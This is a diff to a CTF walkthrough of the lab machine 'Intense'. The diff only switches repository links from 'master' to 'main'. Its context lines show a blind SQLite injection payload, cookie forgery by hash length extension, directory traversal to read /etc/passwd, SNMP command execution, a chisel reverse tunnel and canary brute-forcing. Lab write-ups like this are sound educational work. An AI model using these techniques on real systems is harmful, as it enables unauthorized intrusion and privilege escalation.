@@ -47,18 +47,18 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 #### Site
 
 The site present a home page which tell you that you can login as guest with password guest. I can also download the source code of the app.
-![site](https://github.com/roughiz/Intense-walktrough/blob/master/images/site_guest.png)
+![site](https://github.com/roughiz/Intense-walktrough/blob/main/images/site_guest.png)
 
 Login as "guest" i have a cookie with the parameter "auth" and it contains the guest username and the secret as a sha256 hash, all encoded as base64.
 
-![cookie](https://github.com/roughiz/Intense-walktrough/blob/master/images/cookie_param.png)
+![cookie](https://github.com/roughiz/Intense-walktrough/blob/main/images/cookie_param.png)
 
 #### Code source 
 
 Analyzing the python code source, i found two entries. two admin route which could allows us perform a directory traversal attack and read files from the box. and an other enumerating directories from the box. theses routes are admin access only. The idea is to find a way to be admin.
 
 With a simple look in the code, i found a possibility to perform a sqlite injection exploiting an "insert into" not sanitazed user input, and bruteforce the admin password.
-![insert](https://github.com/roughiz/Intense-walktrough/blob/master/images/insert.png)
+![insert](https://github.com/roughiz/Intense-walktrough/blob/main/images/insert.png)
 
 The vulnerable sqlite request: 
 
@@ -77,7 +77,7 @@ if len(message) > 140:
     if badword_in_str(message):
         return "forbidden word in message"
 ```
-![badword](https://github.com/roughiz/Intense-walktrough/blob/master/images/badwords.png)
+![badword](https://github.com/roughiz/Intense-walktrough/blob/main/images/badwords.png)
 
 ### Sqlite injection
 
@@ -99,7 +99,7 @@ With this structure i can bruteforce password using "substr()" function, if i ha
 ')Union SELECT CASE WHEN username='"""+username+"""' and role=1 and substr(secret,%s,1)='%s' THEN(select load_extension("/tmp/nofile"))END FROM users;--"
 ```
 
-![sqli](https://github.com/roughiz/Intense-walktrough/blob/master/images/sqli.png)
+![sqli](https://github.com/roughiz/Intense-walktrough/blob/main/images/sqli.png)
 
 ####### Reference - Sqlite Sqli 
 
@@ -109,7 +109,7 @@ We can also use many other functions, the goal is to return an error or a return
 
 We have all slqite functions from [here](https://sqlite.org/lang_corefunc.html)
 
-#### Exploit [scirpt](https://github.com/roughiz/Intense-walktrough/blob/master/code/blind_sqlitei_brutfpass.py)
+#### Exploit [scirpt](https://github.com/roughiz/Intense-walktrough/blob/main/code/blind_sqlitei_brutfpass.py)
 
 ```
 $ python3 blind_sqlitei_brutfpass.py -e "not authorized" -l http://10.10.10.195/submitmessage -p "message"
@@ -207,7 +207,7 @@ for key_len in range(8,15):
   new_sign,msg= hashpump(prev_sign.hex(),prev_msg.decode(),Admin_data,key_len)
 ```
 
-The final [scirpt](https://github.com/roughiz/Intense-walktrough/blob/master/code/add_payload_to_cookie.py)
+The final [scirpt](https://github.com/roughiz/Intense-walktrough/blob/main/code/add_payload_to_cookie.py)
 
 #### Exploit 
 
@@ -224,11 +224,11 @@ The key lenght was :12
 
 I put this cookie parameter into the browser and now i'm admin and i have access to the route "/admin"
 
-![admin_access](https://github.com/roughiz/Intense-walktrough/blob/master/images/admin_access.png)
+![admin_access](https://github.com/roughiz/Intense-walktrough/blob/main/images/admin_access.png)
 
 From the app code source we have two routes in admin section.
 
-![admin_entries](https://github.com/roughiz/Intense-walktrough/blob/master/images/admin_entries.png)
+![admin_entries](https://github.com/roughiz/Intense-walktrough/blob/main/images/admin_entries.png)
 
 To have access we have to send a post request with the parameter "logfile" for the route "admin/log/view". post a filename param like : "logfile=test"
 The app source code will verify if the file exist in the "logs/" directory, and open it and return the content :
@@ -242,7 +242,7 @@ if not path.exists(f"logs/{filename}"):
 
 The logfile paramter is not sanitazed and we can perform a directory traversal and read any file, like "/etc/passwd".
 
-![read_file](https://github.com/roughiz/Intense-walktrough/blob/master/images/passwd.png)
+![read_file](https://github.com/roughiz/Intense-walktrough/blob/main/images/passwd.png)
 
 
 ### Digging into snmp
@@ -251,7 +251,7 @@ After some digging, i returned to the first enumeration step where we found the 
 
 From snmpd config file i had a new snmp community :
 
-![snmp](https://github.com/roughiz/Intense-walktrough/blob/master/images/snmpd_config.png)
+![snmp](https://github.com/roughiz/Intense-walktrough/blob/main/images/snmpd_config.png)
 
 ```
  rocommunity public  default    -V systemonly
@@ -448,19 +448,19 @@ And execute it like:
 $  snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195  nsExtendObjects
 ```
 
-![snmp_rce](https://github.com/roughiz/Intense-walktrough/blob/master/images/snmpset.png)
+![snmp_rce](https://github.com/roughiz/Intense-walktrough/blob/main/images/snmpset.png)
 
 ## Shell and user flag:
 
 Finally caught a shell as "Debian-snmp" and the user flag.
 
-![shelluser](https://github.com/roughiz/Intense-walktrough/blob/master/images/shell_user.png)
+![shelluser](https://github.com/roughiz/Intense-walktrough/blob/main/images/shell_user.png)
 
-![flag](https://github.com/roughiz/Intense-walktrough/blob/master/images/user-flag.png)
+![flag](https://github.com/roughiz/Intense-walktrough/blob/main/images/user-flag.png)
 
 ## Road to root :
 
-With a simple enumeration i found a local server running as root. we also have the source [code](https://github.com/roughiz/Intense-walktrough/blob/master/code/note_server.c) of the server.
+With a simple enumeration i found a local server running as root. we also have the source [code](https://github.com/roughiz/Intense-walktrough/blob/main/code/note_server.c) of the server.
 The server is listening  locally to the port 5001.
 
 ```
@@ -549,7 +549,7 @@ $ gcc -Wall -pie -fPIE -fstack-protector-all -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,
 
 gcc use compilation flags like "PIE" and "stack-protector-al" etc... Let's see what protection with checksec:
 
-![checkserver](https://github.com/roughiz/Intense-walktrough/blob/master/images/checkserver.png)
+![checkserver](https://github.com/roughiz/Intense-walktrough/blob/main/images/checkserver.png)
 
 #### Strategy
 
@@ -885,7 +885,7 @@ I created a python script which exploit the binary locally using the same binary
 $ ./chisel client --max-retry-count 1  10.10.14.X:8000 R:5001:127.0.0.1:5001
 ```
 
-![chisel](https://github.com/roughiz/Intense-walktrough/blob/master/images/chisel.png)
+![chisel](https://github.com/roughiz/Intense-walktrough/blob/main/images/chisel.png)
 
 And i can see the port 5001 listening  in my machine :
 
@@ -898,13 +898,13 @@ chisel  6499 user    6u  IPv4 10349808      0t0  TCP *:5001 (LISTEN)
 
 ### Root shell 
 
-#### Exploit [code](https://github.com/roughiz/Intense-walktrough/blob/master/code/root.py)
+#### Exploit [code](https://github.com/roughiz/Intense-walktrough/blob/main/code/root.py)
 
 ```
 $ python3 root.py -i 127.0.0.1 -p 5001
 ```
 
-![chisel](https://github.com/roughiz/Intense-walktrough/blob/master/images/root_shell.png)
+![chisel](https://github.com/roughiz/Intense-walktrough/blob/main/images/root_shell.png)
 
 ## Let's dig more deeper
 
@@ -1012,6 +1012,6 @@ ebp =    brute_word(8, 'ebp',b"",canary)
 rip =    brute_word(8, 'rip',b"",canary+ebp)
 ```
 
-![Image bruteforce ](https://github.com/roughiz/Intense-walktrough/blob/master/images/brtcanary.png)
+![Image bruteforce ](https://github.com/roughiz/Intense-walktrough/blob/main/images/brtcanary.png)
 
 
